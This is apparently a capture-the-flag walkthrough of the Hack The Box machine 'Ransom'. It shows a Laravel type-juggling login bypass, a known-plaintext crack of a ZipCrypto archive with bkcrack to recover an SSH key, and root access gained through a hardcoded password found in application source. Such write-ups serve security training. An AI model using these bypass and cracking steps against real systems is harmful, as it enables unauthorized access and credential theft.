## Default Information
IP Address: 10.10.11.153\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.153 ransom.htb
```
### Rustscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.11.153:22
Open 10.10.11.153:80
```

### Nmap
We will then use the open ports obtained from rustscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | Open |
| 80 | HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |

### Web Enumeration on http://ransom.htb
First, we will use gobuster to enumerate all the endpoints on http://ransom.htb. However, it seems that the Gobuster enumeration is giving back a lot of false positives so we will not enumerate using Gobuster.

Navigating to http://ransom.htb, we are able to find a login page that takes in a password in the form and attempts to authenticate the user via the password. 

For this, it takes in a password parameter and sends a GET request to http://ransom.htb/api/login and tries to authenticate the user.

![Login via password parameter](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ransom/login.png)

Inspecting the source code on the page, we are able to find that the login form on the page makes a GET request to /api/login with the password as the JSON body in the request body

```
$(document).ready(function() {
  $('#loginform').submit(function() {
      $.ajax({
          type: "GET",
          url: 'api/login',
          data: {
              password: $("#password").val()
          },
          success: function(data)
          {
              if (data === 'Login Successful') {
                  window.location.replace('/');
              }
              else {
                (document.getElementById('alert')).style.visibility = 'visible';
                document.getElementById('alert').innerHTML = 'Invalid Login';

              }
          }
      });     
      return false; 
  });
});
```

However, to be able to submit GET requests to /api/login using the password in the JSON body, we would have to add in the following headers in the request body

```
Content-Type: application/json
```

## Exploit
### Type-Juggling in Laravel
Looking at the request, we can see a ```laravel_session``` cookie which tells us that the website is built using Laravel. Since we have a JSON body in the GET request, we can make use of it and attempt to do type juggling.

Using the information from [here](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), we realize that we can do a type juggling on Laravel by setting the JSON fields to ```true```.

![Successful login using type-juggling](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ransom/successful_login.png)

Intercepting the request when we attempt to login to http://ransom.htb and adding the JSON body as shown in the snippet below in the GET request to /api/login, we will be able to authenticate into the website

```
{
    "password":true
}
```

Authenticating into the website, we are the directory listing of 2 files, namely a ```homedirectory.zip``` file and a ```user.txt``` file. 
![Finding directory listing](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ransom/ransom_htb.png)

We will then proceed to download the ```homedirectory.zip``` file onto our local machine.

### Obtaining user flag
Clicking on the download link of the user.txt file will then redirect us to a webpage showing the user flag

![User flag](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ransom/user_flag.png)

### Extracting ZIP file
Looking through the downloaded zip file, we realize the zip file contains a /.ssh/ directory that contains id_rsa key which we could potentially use to obtain SSH access. 

However, we realize that the zip file is password-protected and we would probably need to crack the password in order to view the contents of the zip file.

We will first use ```zip2john``` to convert the zip into a format that can be cracked by JohnTheRipper. Afterwards, we will use JohnTheRipper to attempt to crack the password of the zip folder. However, it seems that the format of the zip file may either be badly formatted or corrupted and JohnTheRipper cannot be used to crack the file.

```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ zip2john uploaded-file-3422.zip > hash.txt
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.bash_logout PKZIP Encr: 2b chk, TS_chk, cmplen=170, decmplen=220, crc=6CE3189B
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.bashrc PKZIP Encr: 2b chk, TS_chk, cmplen=1752, decmplen=3771, crc=AB254644
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.profile PKZIP Encr: 2b chk, TS_chk, cmplen=404, decmplen=807, crc=D1B22A87
ver 1.0 uploaded-file-3422.zip/.cache/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 uploaded-file-3422.zip/.cache/motd.legal-displayed PKZIP Encr: 2b chk, TS_chk, cmplen=12, decmplen=0, crc=0
ver 1.0 efh 5455 efh 7875 uploaded-file-3422.zip/.sudo_as_admin_successful PKZIP Encr: 2b chk, TS_chk, cmplen=12, decmplen=0, crc=0
ver 1.0 uploaded-file-3422.zip/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1990, decmplen=2610, crc=38804579
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=475, decmplen=564, crc=CB143C32
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=475, decmplen=564, crc=CB143C32
ver 2.0 efh 5455 efh 7875 uploaded-file-3422.zip/.viminfo PKZIP Encr: 2b chk, TS_chk, cmplen=581, decmplen=2009, crc=396B04B4
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ john hash.txt --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2022-06-11 21:47) 0g/s 9755Kp/s 9755Kc/s 9755KC/s !jonaluz28!..*7¡Vamos!
Session completed
```

Since we are unable to decrypt the zip file using JohnTheRipper, we will try to use ```7z``` to find out what are the kinds of files that are stored in the zip file and the encryption used. From the output, we can see that this zip file using an algorithm called ```ZipCrypto Deflate``` to encrypt the files. 

```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ 7z l -slt uploaded-file-3422.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 4800H with Radeon Graphics          (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 08:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 
```

Looking at the site [here](https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8), we are given a tutorial on how to crack the ZipCrypto Algorithm.

First of all, we will have to do a known plaintext attack. To do a known plaintext attack, we would need to know the plaintext of one of the files. We notice that the zip file contains a .bash_logout file. This seems like a good candidate as the .bash_logout file are mostly unchanged for most of the servers.

Executing the script, we can find out that the crc32 of ~/.bash_logout is the same as the bash_logout file that is inside the zip archive

```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ python3 crc32.py
0x6ce3189b
```

Next, we will have to add the bash_logout file into the test.zip file

```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ zip test.zip bash_logout       
  adding: bash_logout (deflated 28%)
```
Next download the bkcrack executable from [here](https://github.com/kimci86/bkcrack/releases) and execute bkcrack to obtain the internal keys


```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ ./bkcrack -C uploaded-file-3422.zip -c .bash_logout -P test.zip -p bash_logout
bkcrack 1.4.0 - 2022-05-19
[06:53:24] Z reduction using 150 bytes of known plaintext
100.0 % (150 / 150)
[06:53:25] Attack on 57097 Z values at index 7
Keys: 7b549874 ebc25ec5 7e465e18
78.6 % (44880 / 57097)
[06:54:23] Keys
7b549874 ebc25ec5 7e465e18
```

Using the internal keys, we can then use bkcrack again to replace the password of the encrypted zip with our own password. In this case, we have changed the password to become ```password``` and output the new zip in a new file called ```extracted.zip```

```
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U extracted.zip password
bkcrack 1.4.0 - 2022-05-19
[06:58:34] Writing unlocked archive extracted.zip with password "password"
100.0 % (9 / 9)
Wrote unlocked archive.
```

### Obtaining SSH access
Next, we will the extract the zip file to our local machine. Inspecting the .ssh/authorized_key file, we realized that the authorized user for the id_rsa file is ```htb@ransom```. From there, we can guess that the user is htb@10.10.11.153.

Afterwards, we will use the .ssh/id_rsa file to gain SSH access

```
┌──(kali㉿kali)-[~/Desktop/ransom/extracted]
└─$ ssh -i .ssh/id_rsa htb@10.10.11.153
htb@ransom:~$ whoami
htb
```

However, this is not the root user yet. We would need to find a way to obtain privilege escalation to the root user.
### Privilege Escalation to root

Using the linpeas script, we are able to find another directory ```/srv/prod/public``` in the configuration fiel for Apache in /etc/apache2/sites-enabled/000-default.conf

```
lrwxrwxrwx 1 root root 35 Mar  7 12:16 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /srv/prod/public
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
            <Directory /srv/prod/public>
               Options +FollowSymlinks
               AllowOverride All
               Require all granted
            </Directory>
</VirtualHost>
```

Apart from that, we can also find the database credentials in the /srv/prod/.env files using the linpeas script

```
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 www-data www-data 955 Feb 17 22:54 /srv/prod/.env                                         
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:oMeOXm+U2XVBm5bJWQGv/FxgdorC8xZ6+MsL9HfU8Jc=
APP_DEBUG=true
APP_URL=http://localhost
LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=uhc
DB_USERNAME=uhc
DB_PASSWORD=P@ssw0rd1!
```

Unfortunately, the mysql is not downloaded on the local server and is also not publicly accessible. At the same time, we are unable to download mysql into our local server as we do not have root permissions.

```
htb@ransom:/tmp$ mysql -h 127.0.0.1 -P 3306 -p -u uhc

Command 'mysql' not found, but can be installed with:

sudo apt install mysql-client-core-8.0     # version 8.0.28-0ubuntu0.20.04.3, or
sudo apt install mariadb-client-core-10.3  # version 1:10.3.34-0ubuntu0.20.04.1

htb@ransom:/tmp$ apt install mysql-client-core-8.0
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
----------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ mysql -h 10.10.11.153 -P 3306 -u uhc -p                                                        1 ⨯
Enter password: 
ERROR 2002 (HY000): Can't connect to MySQL server on '10.10.11.153' (115)
```

Navigating to /srv/prod and enumerating the files from there, we are able to find a password (```UHC-March-Global-PW!```) in /srv/prod/app/Http/Controllers/AuthController.php

```
htb@ransom:/srv/prod/app/Http/Controllers$ cat AuthController.php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Requests\RegisterRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    /**
     * Display login page.
     * 
     * @return \Illuminate\Http\Response
     */
    public function show_login()
    {
        return view('auth.login');
    }

    /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);
        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }
        return "Invalid Password";
    }
}
```

Using that password we are able to gain privileged access as a root user.

```
htb@ransom:/srv/prod/app/Http/Controllers$ su -
Password: 
root@ransom:~# 
```
### Obtaining root flag
```
root@ransom:~# cat /root/root.txt
<Redacted root flag>
```
## Post-Exploitation
### Script used to calculate crc32

```python
import binascii
bash_logout_file_data = open("/home/kali/Desktop/ransom/bash_logout",'rb').read()
crc32 = hex(binascii.crc32(bash_logout_file_data) & 0xFFFFFFFF)
print(crc32)
```
